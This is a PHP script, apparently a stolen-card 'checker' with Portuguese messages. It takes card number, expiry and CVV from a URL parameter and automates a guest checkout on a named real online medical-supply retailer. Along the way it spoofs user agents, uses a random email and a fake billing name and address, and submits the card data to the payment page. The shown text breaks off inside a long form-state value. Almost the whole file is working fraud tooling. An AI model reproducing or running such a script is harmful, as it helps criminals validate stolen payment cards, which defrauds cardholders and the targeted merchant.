<?php
error_reporting(0);

$start_time = microtime(true);
$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
echo '{"success":null,"message":"lista ou cartões não são válidos! tente novamente"}';
exit();
}

function deletarCookies() {
    if (file_exists("cvv2.txt")) {
        unlink("cvv2.txt");
    }
}

deletarCookies();

function generateRandomEmail($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $email = '';

    for ($i = 0; $i < $length; $i++) {
        $email .= $characters[rand(0, strlen($characters) - 1)];
    }

    $email .= '';

    return $email;
}

$randomEmail = generateRandomEmail();

function generate_random_user_agent() {
        $user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 9; SM-A205GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; AS 10) like Gecko",
        ];
        return $user_agents[array_rand($user_agents)];
    }
    $user = generate_random_user_agent();

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];
$bin = substr($cc, 0, 6);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
        return trim($str[0]);
    }
    return 'Não encontrado';
}


function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<", " ");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

extract($_GET);
$lista = str_replace(" " , "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/' , '-' , $lista);
$lista = str_replace("/" , "|", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$lista = ("$cc|$mes|$ano|$cvv");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/p-4138-pdi-sani-cloth-af3-germicidal-disposable-wipes.aspx');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'accept-language: en-US,en;q=0.5'
]);
$item = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/addtocart.aspx?ProductID=4138&VariantID=20210&Quantity=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/p-4138-pdi-sani-cloth-af3-germicidal-disposable-wipes.aspx',
    'user-agent: '.$user.'',
]);
$add = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/ShoppingCart.aspx?add=true&ReturnUrl=https%3A%2F%2Fwww.healthykin.com%2Fp-4138-pdi-sani-cloth-af3-germicidal-disposable-wipes.aspx');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/p-4138-pdi-sani-cloth-af3-germicidal-disposable-wipes.aspx',
    'user-agent: '.$user.'',
]);
$cart = curl_exec($ch);

$tsm = getStr($cart, 'name="_TSM_HiddenField_" id="_TSM_HiddenField_" value="', '"');
$viewstate = urlencode(getStr($cart, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$viewstategenerator = getStr($cart, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
$eventvalidation = urlencode(getStr($cart, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/ShoppingCart.aspx?add=true&ReturnUrl=https%3a%2f%2fwww.healthykin.com%2fp-4138-pdi-sani-cloth-af3-germicidal-disposable-wipes.aspx');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.healthykin.com',
    'referer: https://www.healthykin.com/ShoppingCart.aspx?add=true&ReturnUrl=https%3A%2F%2Fwww.healthykin.com%2Fp-4138-pdi-sani-cloth-af3-germicidal-disposable-wipes.aspx',
    'user-agent: '.$user.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_TSM_HiddenField_='.$tsm.'&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.$viewstate.'&__VIEWSTATEGENERATOR='.$viewstategenerator.'&__EVENTVALIDATION='.$eventvalidation.'&ctl00%24PageContent%24ctrlShoppingCart%24ctl00%24txtQuantity=1&ctl00%24PageContent%24btnCheckOutNowBottom=Checkout+Now');
$checkout = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutanon.aspx?checkout=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/ShoppingCart.aspx?add=true&ReturnUrl=https%3A%2F%2Fwww.healthykin.com%2Fp-4138-pdi-sani-cloth-af3-germicidal-disposable-wipes.aspx',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$user.'',
]);
$tchk = curl_exec($ch);

$tsm2 = getStr($tchk, 'name="_TSM_HiddenField_" id="_TSM_HiddenField_" value="', '"');
$viewstate2 = urlencode(getStr($tchk, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$viewstategenerator2 = getStr($tchk, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
$eventvalidation2 = urlencode(getStr($tchk, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutanon.aspx?checkout=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutanon.aspx?checkout=true',
    'user-agent: '.$user.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_TSM_HiddenField_='.$tsm2.'&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='.$viewstate2.'&__VIEWSTATEGENERATOR='.$viewstategenerator2.'&__EVENTVALIDATION='.$eventvalidation2.'&ctl00%24PageContent%24EMail=&ctl00%24PageContent%24Password=&ctl00%24PageContent%24Skipregistration=Guest+Checkout');
$guest = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/createaccount.aspx?checkout=true&skipreg=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutanon.aspx?checkout=true',
    'user-agent: '.$user.'',
]);
$gpage = curl_exec($ch);

$tsm3 = getStr($gpage, 'name="_TSM_HiddenField_" id="_TSM_HiddenField_" value="', '"');
$viewstate3 = urlencode(getStr($gpage, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$viewstategenerator3 = getStr($gpage, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
$eventvalidation3 = urlencode(getStr($gpage, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/createaccount.aspx?checkout=true&skipreg=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.healthykin.com',
    'referer: https://www.healthykin.com/createaccount.aspx?checkout=true&skipreg=true',
    'user-agent: '.$user.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_TSM_HiddenField_='.$tsm3.'&__EVENTTARGET=ctl00%24PageContent%24btnContinueCheckout&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$viewstate3.'&__VIEWSTATEGENERATOR='.$viewstategenerator3.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=929.5130004882812&__EVENTVALIDATION='.$eventvalidation3.'&ctl00%24PageContent%24txtSkipRegEmail='.$randomEmail.'%40gmail.com&ctl00%24PageContent%24ctrlBillingAddress%24NickName=&ctl00%24PageContent%24ctrlBillingAddress%24FirstName=Everaldo&ctl00%24PageContent%24ctrlBillingAddress%24LastName=Moraes&ctl00%24PageContent%24ctrlBillingAddress%24Phone=3476744083&ctl00%24PageContent%24ctrlBillingAddress%24Company=Cu&ctl00%24PageContent%24ctrlBillingAddress%24ResidenceType=Residential&ctl00%24PageContent%24ctrlBillingAddress%24Address1=Virginia+234&ctl00%24PageContent%24ctrlBillingAddress%24Address2=&ctl00%24PageContent%24ctrlBillingAddress%24Suite=&ctl00%24PageContent%24ctrlBillingAddress%24Country=United+States&ctl00%24PageContent%24ctrlBillingAddress%24City=Manassas&ctl00%24PageContent%24ctrlBillingAddress%24State=VA&ctl00%24PageContent%24ctrlBillingAddress%24Zip=10080&ctl00%24PageContent%24ctrlShippingAddress%24NickName=&ctl00%24PageContent%24ctrlShippingAddress%24FirstName=Everaldo&ctl00%24PageContent%24ctrlShippingAddress%24LastName=Moraes&ctl00%24PageContent%24ctrlShippingAddress%24Phone=3476744083&ctl00%24PageContent%24ctrlShippingAddress%24Company=Cu&ctl00%24PageContent%24ctrlShippingAddress%24ResidenceType=Residential&ctl00%24PageContent%24ctrlShippingAddress%24Address1=Virginia+234&ctl00%24PageContent%24ctrlShippingAddress%24Address2=&ctl00%24PageContent%24ctrlShippingAddress%24Suite=&ctl00%24PageContent%24ctrlShippingAddress%24Country=United+States&ctl00%24PageContent%24ctrlShippingAddress%24City=Manassas&ctl00%24PageContent%24ctrlShippingAddress%24State=VA&ctl00%24PageContent%24ctrlShippingAddress%24Zip=10080');
$dsd = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutshipping.aspx?dontupdateid=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/createaccount.aspx?checkout=true&skipreg=true',
    'user-agent: '.$user.'',
]);
$cship = curl_exec($ch);

$tsm4 = getStr($cship, 'name="_TSM_HiddenField_" id="_TSM_HiddenField_" value="', '"');
$viewstate4 = urlencode(getStr($cship, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$viewstategenerator4 = getStr($cship, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
$eventvalidation4  = urlencode(getStr($cship, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));
$idship = getStr($cship, 'selected="selected" value="', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutshipping.aspx?dontupdateid=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutshipping.aspx?dontupdateid=true',
    'user-agent: '.$user.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_TSM_HiddenField_='.$tsm4.'&__EVENTTARGET=ctl00%24PageContent%24btnContinueCheckout&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$viewstate4.'&__VIEWSTATEGENERATOR='.$viewstategenerator4.'&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=929.5130004882812&__EVENTVALIDATION='.$eventvalidation4.'&ctl00%24PageContent%24ddlChooseShippingAddr='.$idship.'&ctl00%24PageContent%24ctrlShippingMethods%24ctrlShippingMethods=1&ctl00%24PageContent%24btnContinueCheckout=Continue+Checkout');
$cfret = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutpayment.aspx');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutshipping.aspx?dontupdateid=true',
    'user-agent: '.$user.'',
]);
$cfrete = curl_exec($ch);

$tsm5 = getStr($cfrete, 'name="_TSM_HiddenField_" id="_TSM_HiddenField_" value="', '"');
$viewstate5 = urlencode(getStr($cfrete, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$viewstategenerator5 = getStr($cfrete, 'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
$eventvalidation5  = urlencode(getStr($cfrete, 'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.healthykin.com/checkoutpayment.aspx');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cvv2.txt');
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.healthykin.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6,en;q=0.5,es;q=0.4',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.healthykin.com',
    'referer: https://www.healthykin.com/checkoutpayment.aspx?TryToShowPM=CREDITCARD&errormsg=44',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$user.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_TSM_HiddenField_='.$tsm5.'&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE4NDE5NTI5NzAPZBYCZg9kFgYCBQ9kFgICAQ8PFgIeB1Zpc2libGVoZGQCBw9kFggCBQ9kFgICAQ8PFgIfAGhkZAIGD2QWAgIBDw8WAh8AaGRkAgcPFgIeBFRleHQFE1BheW1lbnQgSW5mb3JtYXRpb25kAggPZBYCAgEPZBYQAgEPZBYGAgcPFgIeBWNsYXNzBQZhY3RpdmVkAgkPZBYCAgEPDxYCHgdFbmFibGVkaGRkAgsPZBYCAgEPDxYCHwNoZGQCBQ8WAh8BBYcOPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpmdW5jdGlvbiBwb3B1cHdoKHRpdGxlLHVybCx3LGgpCgl7Cgl3aW5kb3cub3BlbigncG9wdXAuYXNweD90aXRsZT0nICsgdGl0bGUgKyAnJnNyYz0nICsgdXJsLCdQb3B1cDc2NTcxJywndG9vbGJhcj1ubyxsb2NhdGlvbj1ubyxkaXJlY3Rvcmllcz1ubyxzdGF0dXM9bm8sbWVudWJhcj1ubyxzY3JvbGxiYXJzPW5vLHJlc2l6YWJsZT1ubyxjb3B5aGlzdG9yeT1ubyx3aWR0aD0nICsgdyArICcsaGVpZ2h0PScgKyBoICsgJyxsZWZ0PTAsdG9wPTAnKTsKCXJldHVybiAodHJ1ZSk7Cgl9CmZ1bmN0aW9uIHBvcHVwdG9waWN3aCh0aXRsZSx0b3BpYyx3LGgsc2Nyb2xsYmFycykKCXsKCXdpbmRvdy5vcGVuKCdwb3B1cC5hc3B4P3RpdGxlPScgKyB0aXRsZSArICcmdG9waWM9JyArIHRvcGljLCdQb3B1cDc2NTcxJywndG9vbGJhcj1ubyxsb2NhdGlvbj1ubyxkaXJlY3Rvcmllcz1ubyxzdGF0dXM9bm8sbWVudWJhcj1ubyxzY3JvbGxiYXJzPScgKyBzY3JvbGxiYXJzICsgJyxyZXNpemFibGU9bm8sY29weWhpc3Rvcnk9bm8sd2lkdGg9JyArIHcgKyAnLGhlaWdodD0nICsgaCArICcsbGVmdD0wLHRvcD0wJyk7CglyZXR1cm4gKHRydWUpOwoJfQpmdW5jdGlvbiBwb3B1cG9yZGVyb3B0aW9ud2godGl0bGUsaWQsdyxoLHNjcm9sbGJhcnMpCgl7Cgl3aW5kb3cub3BlbigncG9wdXAuYXNweD90aXRsZT0nICsgdGl0bGUgKyAnJm9yZGVyb3B0aW9uaWQ9JyArIGlkLCdQb3B1cDc2NTcxJywndG9vbGJhcj1ubyxsb2NhdGlvbj1ubyxkaXJlY3Rvcmllcz1ubyxzdGF0dXM9bm8sbWVudWJhcj1ubyxzY3JvbGxiYXJzPScgKyBzY3JvbGxiYXJzICsgJyxyZXNpemFibGU9bm8sY29weWhpc3Rvcnk9bm8sd2lkdGg9JyArIHcgKyAnLGhlaWdodD0nICsgaCArICcsbGVmdD0wLHRvcD0wJyk7CglyZXR1cm4gKHRydWUpOwoJfQpmdW5jdGlvbiBwb3B1cGtpdGdyb3Vwd2godGl0bGUsa2l0Z3JvdXBpZCx3LGgsc2Nyb2xsYmFycykKCXsKCXdpbmRvdy5vcGVuKCdwb3B1cC5hc3B4P3RpdGxlPScgKyB0aXRsZSArICcma2l0Z3JvdXBpZD0nICsga2l0Z3JvdXBpZCwnUG9wdXA3NjU3MScsJ3Rvb2xiYXI9bm8sbG9jYXRpb249bm8sZGlyZWN0b3JpZXM9bm8sc3RhdHVzPW5vLG1lbnViYXI9bm8sc2Nyb2xsYmFycz0nICsgc2Nyb2xsYmFycyArICcscmVzaXphYmxlPW5vLGNvcHloaXN0b3J5PW5vLHdpZHRoPScgKyB3ICsgJyxoZWlnaHQ9JyArIGggKyAnLGxlZnQ9MCx0b3A9MCcpOwoJcmV0dXJuICh0cnVlKTsKCX0KZnVuY3Rpb24gcG9wdXBraXRpdGVtd2godGl0bGUsa2l0aXRlbWlkLHcsaCxzY3JvbGxiYXJzKQoJewoJd2luZG93Lm9wZW4oJ3BvcHVwLmFzcHg%2FdGl0bGU9JyArIHRpdGxlICsgJyZraXRpdGVtaWQ9JyArIGtpdGl0ZW1pZCwnUG9wdXA3NjU3MScsJ3Rvb2xiYXI9bm8sbG9jYXRpb249bm8sZGlyZWN0b3JpZXM9bm8sc3RhdHVzPW5vLG1lbnViYXI9bm8sc2Nyb2xsYmFycz0nICsgc2Nyb2xsYmFycyArICcscmVzaXphYmxlPW5vLGNvcHloaXN0b3J5PW5vLHdpZHRoPScgKyB3ICsgJyxoZWlnaHQ9JyArIGggKyAnLGxlZnQ9MCx0b3A9MCcpOwoJcmV0dXJuICh0cnVlKTsKCX0KZnVuY3Rpb24gcG9wdXAodGl0bGUsdXJsKQoJewoJcG9wdXB3aCh0aXRsZSx1cmwsNjAwLDM3NSk7CglyZXR1cm4gKHRydWUpOwoJfQpmdW5jdGlvbiBwb3B1cHRvcGljKHRpdGxlLHRvcGljLHNjcm9sbGJhcnMpCgl7Cglwb3B1cHRvcGljd2godGl0bGUsdG9waWMsNjAwLDM3NSxzY3JvbGxiYXJzKTsKCXJldHVybiAodHJ1ZSk7Cgl9Cjwvc2NyaXB0PgpkAgcPDxYCHwBnZBYCAgEPDxYCHwEF7gFDVlYyIE1pc21hdGNoLiBQbGVhc2UgbWFrZSBzdXJlIHRoYXQgeW91IGFyZSBlbnRlcmluZyB5b3VyIGNyZWRpdCBjYXJkIG51bWJlciBhbmQgZXhwaXJhdGlvbiBkYXRlIGNvcnJlY3RseS4mbmJzcDtNYWtlIGNlcnRhaW4geW91ciBiaWxsaW5nIGFkZHJlc3MgbWF0Y2hlcyBleGFjdGx5IHdpdGggd2hhdCB5b3VyIGNyZWRpdC9kZWJpdCBjYXJkIGNvbXBhbnkgaGFzIG9uIGZpbGUuDQo8ZGl2PjxiciAvPg0KPC9kaXY%2BZGQCFQ9kFgQCAw8WAh8BZWQCBQ8PZBYCHgdvbmNsaWNrBYkCaWYgKHR5cGVvZihQYWdlX0NsaWVudFZhbGlkYXRlKSA9PSAnZnVuY3Rpb24nKSB7IGlmIChQYWdlX0NsaWVudFZhbGlkYXRlKCkgPT0gZmFsc2UpIHsgcmV0dXJuIGZhbHNlOyB9fSB0aGlzLmRpc2FibGVkID0gdHJ1ZTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY3RsMDBfUGFnZUNvbnRlbnRfYnRuQ29udGludWVDaGVja091dDEiKS5kaXNhYmxlZCA9IHRydWU7X19kb1Bvc3RCYWNrKCdjdGwwMCRQYWdlQ29udGVudCRidG5Db250aW51ZUNoZWNrT3V0MScsJycpO2QCFw9kFgICBQ9kFgJmDxYCHwFlZAIZD2QWBAIDDxAPFgIeDEF1dG9Qb3N0QmFja2dkEBUCHlZpcmdpbmlhIDIzNCBNYW5hc3NhcyBWQSAxMDA4MBMtLUFERCBORVcgQUREUkVTUy0tFQIHMzI5MjQ2MgEwFCsDAmdnFgFmZAIFD2QWBgIZDxBkDxYDZgIBAgIWAxAFB1Vua25vd24FATBnEAULUmVzaWRlbnRpYWwFATFnEAUKQ29tbWVyY2lhbAUBMmcWAQIBZAIxDxAPFgYeDURhdGFUZXh0RmllbGQFBE5hbWUeDkRhdGFWYWx1ZUZpZWxkBQROYW1lHgtfIURhdGFCb3VuZGdkEBUBDVVuaXRlZCBTdGF0ZXMVAQ1Vbml0ZWQgU3RhdGVzFCsDAWcWAWZkAjcPEA8WBh8GBQROYW1lHwcFDEFiYnJldmlhdGlvbh8IZ2QQFTMHQWxhYmFtYQZBbGFza2EHQXJpem9uYQhBcmthbnNhcwpDYWxpZm9ybmlhCENvbG9yYWRvC0Nvbm5lY3RpY3V0CERlbGF3YXJlFERpc3RyaWN0IG9mIENvbHVtYmlhB0Zsb3JpZGEHR2VvcmdpYQZIYXdhaWkFSWRhaG8ISWxsaW5vaXMHSW5kaWFuYQRJb3dhBkthbnNhcwhLZW50dWNreQlMb3Vpc2lhbmEFTWFpbmUITWFyeWxhbmQNTWFzc2FjaHVzZXR0cwhNaWNoaWdhbglNaW5uZXNvdGELTWlzc2lzc2lwcGkITWlzc291cmkHTW9udGFuYQhOZWJyYXNrYQZOZXZhZGENTmV3IEhhbXBzaGlyZQpOZXcgSmVyc2V5Ck5ldyBNZXhpY28ITmV3IFlvcmsOTm9ydGggQ2Fyb2xpbmEMTm9ydGggRGFrb3RhBE9oaW8IT2tsYWhvbWEGT3JlZ29uDFBlbm5zeWx2YW5pYQxSaG9kZSBJc2xhbmQOU291dGggQ2Fyb2xpbmEMU291dGggRGFrb3RhCVRlbm5lc3NlZQVUZXhhcwRVdGFoB1Zlcm1vbnQIVmlyZ2luaWEKV2FzaGluZ3Rvbg1XZXN0IFZpcmdpbm